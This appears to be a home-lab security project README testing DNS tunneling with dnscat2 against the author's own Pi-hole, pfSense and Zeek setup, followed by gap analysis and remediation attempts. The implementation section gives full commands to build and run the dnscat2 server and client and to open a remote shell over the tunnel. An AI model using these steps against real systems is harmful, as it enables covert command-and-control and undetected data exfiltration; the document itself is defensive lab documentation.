# Project 6: DNS Tunneling Detection & Security Gap Analysis

![Project Status](https://img.shields.io/badge/Status-Complete-success)
![Detection](https://img.shields.io/badge/Detection-Gap%20Identified-critical)
![Follow--up](https://img.shields.io/badge/Follow--up-Project%206a%20Failed-red)

## 📋 Executive Summary

This project demonstrates DNS tunneling attack techniques using **dnscat2** to validate detection capabilities of deployed security infrastructure (Pi-hole, Zeek, pfSense). The implementation successfully established an encrypted command-and-control channel that **completely bypassed all security monitoring**, revealing critical architectural blind spots in DNS-based threat detection.

### Key Outcomes

- ✅ Successfully deployed DNS tunneling infrastructure across network segments
- ⚠️ **Identified complete detection bypass** - 0% visibility across all security tools
- 📊 Validated that DNS controls only function when clients use approved infrastructure
- 🔧 Documented architectural remediation requirements (firewall policy enforcement)
- ❌ Follow-up remediation attempt (Project 6a) **failed** due to pfSense architecture limitations

---

## 🎯 Project Objectives

### Primary Goals
1. Deploy functional DNS tunneling infrastructure demonstrating real-world C2 techniques
2. Validate detection effectiveness of deployed security monitoring tools
3. Identify specific architectural weaknesses enabling detection bypass
4. Document security gaps requiring infrastructure hardening
5. Establish baseline for detection improvement

### Learning Outcomes
- DNS protocol exploitation and covert channel creation
- dnscat2 tool usage for command and control simulation
- Security infrastructure testing and validation methodologies
- Detection gap analysis and root cause identification
- Architectural security assessment and remediation planning

---

## 🏗️ Architecture Overview

### Attack Topology

```
┌─────────────────────────────────────────────────────────────┐
│                     MANAGEMENT NETWORK                       │
│                      (192.168.10.0/24)                       │
│                                                               │
│  ┌──────────────────────────────────────┐                   │
│  │     Kali Linux (Attack Server)       │                   │
│  │         192.168.10.4                 │                   │
│  │                                       │                   │
│  │  • dnscat2 Server (Port 53/UDP)      │                   │
│  │  • Encrypted C2 Communication        │                   │
│  │  • Domain: tunnel.lab.local          │                   │
│  └──────────────────────────────────────┘                   │
│                       │                                      │
└───────────────────────┼──────────────────────────────────────┘
                        │
                  DNS Tunnel
           (Complete Security Bypass)
                        │
┌───────────────────────┼──────────────────────────────────────┐
│                       ▼                                      │
│                  INTERNAL NETWORK                            │
│                  (192.168.30.0/24)                           │
│                                                               │
│  ┌──────────────────────────────────────┐                   │
│  │   DVWA (Compromised Target)          │                   │
│  │       192.168.30.90                  │                   │
│  │                                       │                   │
│  │  • dnscat2 Client                    │                   │
│  │  • Direct DNS to 192.168.10.4:53     │                   │
│  │  • Bypasses ALL security controls    │                   │
│  └──────────────────────────────────────┘                   │
│                                                               │
└───────────────────────────────────────────────────────────────┘

Security Controls (ALL BYPASSED):
├── Pi-hole DNS Filtering → 0 queries logged
├── pfSense Firewall Logs → 0 entries captured  
├── pfSense DNS Resolver → 0 tunnel queries visible
└── Zeek Network Monitor → 0 connections detected
```

### DNS Tunneling Technique

**How It Works:**
```
Normal DNS Query:
www.example.com → DNS Server → IP Address

DNS Tunnel (Data Exfiltration):
[base64-encoded-data].tunnel.lab.local → Attacker DNS → Command Response

Example Tunnel Query:
SGVsbG8gV29ybGQ.tunnel.lab.local
└─ Encodes: "Hello World" as DNS subdomain
```

---

## 🛠️ Technical Implementation

### Prerequisites

#### Infrastructure Requirements
- **Attack Platform**: Kali Linux (192.168.10.4) with root/sudo access
- **Target System**: DVWA Ubuntu server (192.168.30.90) with SSH access
- **Network**: Cross-segment routing between Management and Internal networks
- **Security Tools**: Pi-hole, pfSense, Zeek (pre-deployed)

#### Software Dependencies
```bash
# Attack Server (Kali)
- Ruby 2.7+
- git
- bundler
- Build tools (gcc, make)

# Target System (DVWA)
- gcc compiler
- make
- build-essential
```

### Installation Steps

#### Phase 1: dnscat2 Server Setup (Kali)

```bash
# Clone dnscat2 repository
cd /opt
sudo git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server

# Install dependencies
sudo gem install bundler
sudo bundle install

# Start DNS server
sudo ruby dnscat2.rb tunnel.lab.local --no-cache

# Expected output:
# New window created: 0
# dnscat2> Listening on 0.0.0.0:53
# Waiting for DNS connections...
```

#### Phase 2: dnscat2 Client Deployment (DVWA)

```bash
# SSH to compromised target
ssh user@192.168.30.90

# Clone and compile client
cd /tmp
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/client
make

# Execute tunnel connection
./dnscat --dns server=192.168.10.4,domain=tunnel.lab.local

# Success indicators:
# - "Session established" message
# - Interactive shell available on Kali server
```

#### Phase 3: Verify Encrypted Tunnel

```bash
# On Kali dnscat2 server console:
dnscat2> sessions
dnscat2> session -i 1
command (DVWA) 1> shell
Sent request to execute a shell

# Interactive shell established:
command (DVWA) 1> whoami
www-data

command (DVWA) 1> pwd
/var/www/html
```

---

## 🔍 Testing & Validation

### Detection Capability Assessment

#### Test 1: Pi-hole DNS Filtering
```bash
# Check Pi-hole query logs
http://192.168.10.5/admin/queries.php

Result: ❌ FAILED
- 0 queries to tunnel.lab.local logged
- Pi-hole never saw the DNS traffic
- Reason: Client bypassed Pi-hole by connecting directly to 192.168.10.4:53
```

#### Test 2: pfSense Firewall Logs
```bash
# Check pfSense firewall rules
Status > System Logs > Firewall

Result: ❌ FAILED
- 0 blocked connections logged
- Firewall allows unrestricted outbound UDP/TCP port 53
- Rule: "allow all port 53" permitted tunnel establishment
```

#### Test 3: pfSense DNS Resolver
```bash
# Check Unbound DNS resolver logs
Status > System Logs > DNS Resolver

Result: ❌ FAILED
- 0 tunnel queries visible
- DNS Resolver never processed tunnel traffic
- Reason: Client bypassed resolver through direct connection
```

#### Test 4: Zeek Network Monitoring
```bash
# Check Zeek DNS logs
tail -f /opt/zeek/logs/current/dns.log

Result: ❌ FAILED
- 0 connections detected
- Zeek monitoring SPAN port on LAN segment
- Reason: Routed cross-segment traffic not visible to SPAN capture
```

### Detection Summary

| Security Control | Expected Detection | Actual Detection | Status |
|-----------------|-------------------|------------------|--------|
| Pi-hole DNS Filtering | Block/Log tunnel queries | 0 queries logged | ❌ BYPASSED |
| pfSense Firewall | Block unauthorized DNS | 0 blocks logged | ❌ BYPASSED |
| pfSense DNS Resolver | Log all DNS queries | 0 tunnel queries | ❌ BYPASSED |
| Zeek Network Monitor | Detect tunnel traffic | 0 connections seen | ❌ BYPASSED |

**Overall Detection Rate: 0%** - Complete security bypass achieved

---

## 🚨 Critical Findings

### Root Cause Analysis

**Architectural Weakness Identified:**

DNS security controls (Pi-hole, pfSense forwarding) **only protect clients that voluntarily use them**. Current firewall policy permits unrestricted outbound connections to any DNS server on port 53/UDP and 53/TCP.

```
Current (Insecure) Architecture:
┌─────────┐                    ┌──────────────┐
│ Client  │──── Can bypass ───>│ Attacker DNS │
└─────────┘                    │ 192.168.10.4 │
     │                         └──────────────┘
     │ (Optional)
     v
┌─────────┐
│ Pi-hole │ <-- Never reached if client chooses different DNS
└─────────┘

Required (Secure) Architecture:
┌─────────┐                    
│ Client  │──X Blocked by Firewall X──> Attacker DNS
└─────────┘                    
     │
     │ (Enforced)
     v
┌─────────┐
│ Pi-hole │ <-- All DNS traffic forced through approved infrastructure
└─────────┘
```

### Security Gaps

1. **No DNS Server Restriction**
   - Clients can connect to any DNS server
   - No firewall rules enforce approved DNS infrastructure
   - Attack: Direct connection to attacker-controlled DNS (192.168.10.4:53)

2. **Detection Bypass Path**
   - Pi-hole: Only monitors clients using it as DNS server
   - Zeek: Cannot see routed cross-segment traffic (SPAN limitation)
   - pfSense: Logs show allowed traffic, no visibility into DNS content

3. **Lack of Defense-in-Depth**
   - Single point of failure if client bypasses DNS controls
   - No secondary detection layers for protocol abuse
   - No DNS query pattern analysis or anomaly detection

---

## 🔧 Remediation Recommendations

### Priority 1: Firewall-Based DNS Enforcement

**Objective**: Force all clients to use approved DNS infrastructure

```
Recommended pfSense Rules (Internal Network):

Rule 1: Block Direct DNS to Unauthorized Servers
- Action: Block
- Interface: LAN (Internal)
- Protocol: TCP/UDP
- Source: LAN net (192.168.30.0/24)
- Destination: * (any)
- Destination Port: 53 (DNS)
- Description: "Block unauthorized DNS - force through Pi-hole"

Rule 2: Allow DNS to Approved Infrastructure Only
- Action: Pass
- Interface: LAN (Internal)
- Protocol: TCP/UDP
- Source: LAN net (192.168.30.0/24)
- Destination: 192.168.10.5 (Pi-hole)
- Destination Port: 53
- Description: "Allow DNS to Pi-hole only"
```

**Expected Outcome**: DNS tunnel attempts will fail and generate firewall logs

### Priority 2: Enhanced Logging & Alerting

1. **Pi-hole Configuration**
   - Enable detailed query logging
   - Configure alerts for high DNS query volumes
   - Implement domain blacklists for known C2 domains

2. **pfSense Logging**
   - Enable detailed logging for blocked DNS attempts
   - Configure syslog forwarding to SIEM (ELK/Wazuh)
   - Set up alerts for repeated DNS bypass attempts

3. **Zeek Network Monitoring**
   - Deploy Zeek on routed path (not just SPAN)
   - Enable DNS protocol analysis
   - Configure anomaly detection for DNS tunneling patterns

### Priority 3: Detection Validation

After implementing firewall rules:
1. Re-attempt DNS tunnel establishment
2. Verify tunnel fails and generates alerts
3. Confirm legitimate DNS continues functioning
4. Document detection improvement metrics

---

## ⚠️ Project 6a Follow-Up (FAILED)

**Attempted Remediation Status**: ❌ **UNSUCCESSFUL**

Following the critical gaps identified in Project 6, **Project 6a** attempted to implement firewall-based DNS enforcement. After 3+ hours of systematic testing across 5 different approaches, **all remediation attempts failed**.

### Why Remediation Failed

**Root Cause**: pfSense DNS Resolver in forwarding mode requires complex internal traffic flows between multiple interfaces (localhost, LAN, internal processes) that cannot be adequately modeled in firewall rules. Any restriction on port 53 traffic interferes with legitimate DNS forwarding operations.

**Approaches Tested** (All Failed):
1. ❌ Basic firewall rules (blocked both tunnel + legitimate DNS)
2. ❌ NAT port redirect (caused SERVFAIL responses)
3. ❌ DNS Resolver bind configuration (incompatible with forwarding)
4. ❌ Outbound NAT modifications (broke DNS forwarding)
5. ❌ Interface-specific restrictions (systemic DNS failure)

### Current Security Posture

**Status**: DNS tunneling gap **remains unresolved**

**Decision**: Accept documented risk and focus security efforts on attack vectors where detection capability exists:
- ✅ Host-based detection (Wazuh on 6 systems)
- ✅ Network monitoring (Zeek on 2 segments)
- ✅ Perimeter security (pfSense logging)
- ✅ SIEM correlation (Wazuh + ELK)
- ❌ DNS tunneling detection (architectural limitation)

**Alternative Solutions** (Not Implemented):
- Major DNS infrastructure redesign (estimated 2-3+ hours, high outage risk)
- Cloud-based DNS filtering (Cloudflare Gateway, Cisco Umbrella)
- Dedicated DNS security appliance (not available in home lab)

**See**: `Project_6a__DNS_Security_Remediation__Implementation_Report.pdf` for complete failure analysis

---

## 📊 Skills Demonstrated

### Offensive Security
- DNS covert channel exploitation techniques
- dnscat2 client-server architecture deployment
- Cross-network encrypted C2 channel establishment
- Post-compromise command and control simulation
- Protocol abuse and detection evasion methods

### Defensive Security
- Security infrastructure penetration testing
- Multi-tool detection capability assessment
- Systematic vulnerability validation
- Defense-in-depth evaluation
- Architectural security weakness identification

### Security Analysis
- Root cause analysis of detection failures
- Attack path documentation
- Risk assessment and prioritization
- Remediation planning and recommendation
- Security control validation methodology

---

## 🎓 Career Relevance

This project demonstrates competencies aligned with:

### Job Roles
- **Penetration Tester**: Simulating real-world attack techniques
- **Security Analyst**: Evaluating detection control effectiveness
- **Security Architect**: Identifying architectural security gaps
- **Red Team Operator**: Establishing covert C2 channels
- **Blue Team Engineer**: Understanding attacker TTPs for detection

### Industry Frameworks

**MITRE ATT&CK Techniques:**
- `T1071.004` - Application Layer Protocol: DNS
- `T1048.003` - Exfiltration Over Alternative Protocol
- `T1090.001` - Proxy: Internal Proxy
- `T1102` - Web Service (C2 over DNS)

**NIST Cybersecurity Framework:**
- `DE.CM-1`: Network monitoring for detecting potential cybersecurity events
- `DE.CM-7`: Monitor for unauthorized DNS queries
- `RS.AN-1`: Investigate security incidents
- `PR.AC-5`: Network integrity protection

---

## 📚 References

### DNS Tunneling Resources
- [dnscat2 Official Repository](https://github.com/iagox86/dnscat2)
- [SANS DNS Covert Channel Detection](https://www.sans.org/)
- [DNS Tunneling Research Papers](https://scholar.google.com/)

### Technical Standards
- **RFC 1035**: Domain Names - Implementation and Specification
- **RFC 8499**: DNS Terminology and Concepts
- **NIST SP 800-81-2**: Secure Domain Name System Deployment Guide
- **CIS Controls**: DNS Security and Monitoring Guidelines

### Security Tools
- [Pi-hole Documentation](https://docs.pi-hole.net/)
- [pfSense Firewall Documentation](https://docs.netgate.com/pfsense/)
- [Zeek Network Security Monitor](https://docs.zeek.org/)

---

## 🔗 Related Projects

- **Project 2**: Baseline Firewall Policy (DNS restrictions attempted here)
- **Project 3**: Pi-hole DNS Filtering (bypassed in this project)
- **Project 4**: SPAN/TAP Configuration (limitation identified)
- **Project 5**: Zeek Network Monitoring (detection gap revealed)
- **Project 6a**: DNS Security Remediation (failed follow-up)
- **Project 7**: Wazuh SIEM (alternative detection capability)
- **Project 8**: ELK Stack SIEM (log aggregation and correlation)

---

## 📝 Project Status

| Component | Status | Notes |
|-----------|--------|-------|
| DNS Tunnel Implementation | ✅ Complete | Successfully established C2 channel |
| Detection Testing | ✅ Complete | All 4 security tools tested |
| Gap Analysis | ✅ Complete | Root cause identified and documented |
| Remediation Recommendations | ✅ Complete | Firewall rules and architecture changes proposed |
| Remediation Implementation (6a) | ❌ Failed | Architecture incompatible with enforcement |
| Overall Project Goal | ⚠️ Partial | Identified gaps but cannot fix with current architecture |

---

## 🎯 Key Takeaways

1. **Security controls are only effective when enforced** - Optional security measures can be bypassed
2. **Detection requires visibility** - SPAN-based monitoring has blind spots in routed environments
3. **Defense-in-depth is critical** - Single-layer security fails when bypassed
4. **Architecture matters** - Some security requirements conflict with service design
5. **Documentation is valuable** - Knowing and accepting risks is better than assuming protection

---

## 🔐 Enterprise Value

This project demonstrates critical capabilities for enterprise security:

**Risk Identification**: Proactive discovery of security gaps before exploitation

**Validation Methodology**: Systematic testing approach applicable to production environments

**Realistic Threat Simulation**: Demonstrates actual attacker techniques, not theoretical vulnerabilities

**Business Impact**: Evidence-based justification for infrastructure hardening investment

**Security Maturity**: Transition from assumption-based to validated security controls

---

## 📄 License

This project documentation is provided for educational and cybersecurity research purposes. Always obtain proper authorization before conducting security testing.

---

## ✍️ Author

**Prageeth Panicker**  
Cybersecurity Home Lab Project Series  
Week 2 - Project 6

**Version**: 1.0  
**Date**: September 30, 2025  
**Status**: Detection Gap Identified - Remediation Attempted (Failed)

---

## 🚀 Next Steps

1. Implement Snort IDS on pfSense for signature-based DNS detection (Project 10)
2. Integrate DNS security events with SIEM platforms (ELK + Wazuh)
3. Deploy endpoint DNS monitoring on critical systems
4. Develop automated response workflows through Shuffle SOAR
5. Consider cloud-based DNS filtering for enforcement at provider level

**Note**: Until DNS enforcement is architecturally possible, this remains a documented security gap with mitigation through layered detection (Wazuh host-based + Zeek network monitoring + SIEM correlation).
